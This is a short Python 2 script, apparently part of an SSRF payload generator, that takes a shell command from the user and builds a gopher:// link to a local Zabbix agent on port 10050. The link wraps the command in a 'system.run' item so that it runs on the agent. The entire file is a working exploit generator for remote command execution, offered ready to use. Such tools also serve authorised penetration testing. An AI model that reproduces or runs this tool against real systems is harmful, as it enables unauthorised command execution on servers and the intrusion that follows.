import urllib

def Zabbix():
    print "\033[01m"+"\nExecute SHELL command: \n" + "\033[0m"
    command = raw_input("\033[96m" +"\nEnter Shell Command to Execute: "+ "\033[0m")

    if(not command):
        command = "ls"

    payload = "system.run[("  + command + ");sleep 2s]"
    finalpayload = urllib.quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")

    print "\033[93m" +"\nYour gopher link is ready to do SSRF: \n"+ "\033[0m"
    print "\033[04m" +"gopher://127.0.0.1:10050/_" + finalpayload+ "\033[0m"
    print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m"
